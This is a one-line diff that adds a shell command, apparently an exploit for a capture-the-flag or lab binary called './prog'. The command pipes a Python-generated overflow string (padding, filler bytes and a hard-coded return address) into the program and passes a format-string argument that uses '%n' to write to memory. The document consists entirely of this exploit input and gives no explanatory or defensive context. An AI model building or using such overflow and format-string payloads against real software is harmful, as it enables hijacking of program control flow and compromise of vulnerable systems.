@@ -1,0 +1,1 @@
+python -c 'print "A"*0x6c + "BBBB" + "\x9b\x84\x04\x08"' | ./prog '%420u%7$n'
